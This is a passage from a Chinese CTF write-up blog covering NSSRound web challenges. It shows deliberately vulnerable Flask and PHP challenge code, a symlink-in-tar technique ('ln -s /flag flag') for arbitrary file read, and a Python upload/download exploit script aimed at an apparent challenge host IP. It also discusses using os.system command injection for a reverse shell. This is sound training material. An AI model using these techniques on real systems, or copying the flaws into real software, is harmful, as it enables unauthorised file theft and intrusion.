class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>这个看起来比较绕</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128784449?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000275616800180675463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168000275616800180675463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128784449-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=%5BNSSRound%237%20Team%5D0o0&amp;spm=1018.2226.3001.4187">这篇文章写的很详细了</a></p><p>只不过里面有个点写错了，就是绕过<code>if ($NSScTf != 114514 &amp;&amp; intval($NSScTf, 0) === 114514)</code>这个的时候</p><p><img src="../images/image-20230328195154093.png" alt="image-20230328195154093"></p><p>应该要这样绕过</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">探姬写的关于死亡die绕过的，还有一些关于文件包含的filter</a></p><p>就是很有学习价值</p><h2 id="NSSRound-7-Team-ShadowFlag"><a href="#NSSRound-7-Team-ShadowFlag" class="headerlink" title="[NSSRound#7 Team]ShadowFlag"></a>[NSSRound#7 Team]ShadowFlag</h2><p>考点</p><p><img src="../images/image-20230328195559824.png" alt="image-20230328195559824"></p><p><a href="https://www.bilibili.com/video/BV1jY411S71X/?vd_source=bacfffe46b930fda5761b63367eb298c">wp视频地址</a></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag2 = f.read()</span><br><span class="line">tag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">global</span> tag</span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">global</span> flag1</span><br><span class="line">        <span class="keyword">del</span> flag1</span><br><span class="line">        tag = <span class="literal">True</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)</span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.system(action)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):</span><br><span class="line">    sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;扫扫扫，扫啥东方明珠呢[怒]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题可以学到很多</p><p><a href="https://dqgom7v7dl.feishu.cn/docx/RL8cdsipLoYAMvxl8bJcIERznWH">反弹shell大合集</a></p><p><a href="https://blog.csdn.net/qq_63169208/article/details/129267023?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168000642516800186549329%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168000642516800186549329&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-129267023-null-null.142^v76^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ShadowFlag&amp;spm=1018.2226.3001.4187">wp文章</a></p><p>这里的话就是利用下面的os.system进行反弹shell，因为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br></pre></td></tr></table></figure><p>有with的话是打开文件后会关闭，没有with的是不会关闭</p><p>所以说flag1就会一直存在在后台进程里面，不会被结束</p><p>删除了没事，在后台进程还是能看到</p><p>这就是全部了</p><p><a href="https://github.com/Randark-JMT/NSSCTF-Round_v7-ShadowFlag">题目的github地址</a></p><h2 id="NSSRound-6-Team-check-V1"><a href="#NSSRound-6-Team-check-V1" class="headerlink" title="[NSSRound#6 Team]check(V1)"></a>[NSSRound#6 Team]check(V1)</h2><p>考点</p><p><img src="../images/image-20230328210025627.png" alt="image-20230328210025627"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>漏洞点在于  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br></pre></td></tr></table></figure><p><strong>思路</strong></p><p>生成一个<a href="https://so.csdn.net/so/search?q=软链接&amp;spm=1001.2101.3001.7020">软链接</a>，通过<code>软链接</code>链接到<code>/flag文件</code>，然后将软链接打包成tar文件上传，之后再读取文件，读取文件时，由于<code>extractall</code>提取出来的是一个软链接，后面读取的时候就是/flag文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /flag flag</span><br><span class="line">tar -cvf flag.tar flag</span><br></pre></td></tr></table></figure><p><strong>软链接可以实现任意文件的读取</strong></p><p>这里就是先通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar = tarfile.open(file_save_path, &quot;r&quot;)</span><br><span class="line">tar.extractall(app.config[&#x27;UPLOAD_FOLDER&#x27;])</span><br></pre></td></tr></table></figure><p>解压压缩包，然后extractall提取的是一个软链接，后面跟着的是提取出来的flag</p><p>然后在访问download，就是实现读取代码，读取到解压后名字为flag的文件</p><p>flag.tar    解压后——&gt;    flag</p><p><strong>所以payload脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><p>tar包在自己的kali上生成</p><h2 id="NSSRound-6-Team-check-V2"><a href="#NSSRound-6-Team-check-V2" class="headerlink" title="[NSSRound#6 Team]check(V2)"></a>[NSSRound#6 Team]check(V2)</h2><p>考点</p><p><img src="../images/image-20230329111310192.png" alt="image-20230329111310192"></p><p>上一题的升级版</p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;tar&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(file.filename)</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename) <span class="keyword">and</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename <span class="keyword">and</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a tarfile&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>这里和checkv1的话只有一处不一样</p><p><img src="../images/image-20230329192945502.png" alt="image-20230329192945502"></p><p><img src="../images/image-20230329192951184.png" alt="image-20230329192951184"></p><p>v1是用root用户来执行clean.sh</p><p>v2是用普通用户ctf来执行clean</p><p> <strong>这里的不同可能是因为出题人想的解法不同</strong></p><p>因为这里的解法用的是软链接，所以修改这里的并不影响</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28089/&quot;</span></span><br><span class="line">filename = <span class="string">r&quot;./flag.tar&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">url ,fileName</span>):</span><br><span class="line">    url = url + <span class="string">&quot;upload&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(fileName,<span class="string">&#x27;rb&#x27;</span>)&#125; <span class="comment">#这里是上传文件</span></span><br><span class="line">    response = req.post(url=url, files = file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">    url = url+<span class="string">&quot;download&quot;</span></span><br><span class="line">    file = &#123;<span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag&quot;</span>&#125; <span class="comment">#这里是post数据</span></span><br><span class="line">    response = req.post(url, data=file)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    upload(url,filename)</span><br><span class="line">    download(url)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-6-Team-check-Revenge"><a href="#NSSRound-6-Team-check-Revenge" class="headerlink" title="[NSSRound#6 Team]check(Revenge)"></a>[NSSRound#6 Team]check(Revenge)</h2><p>考点</p><p><img src="../images/image-20230329193554819.png" alt="image-20230329193554819"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 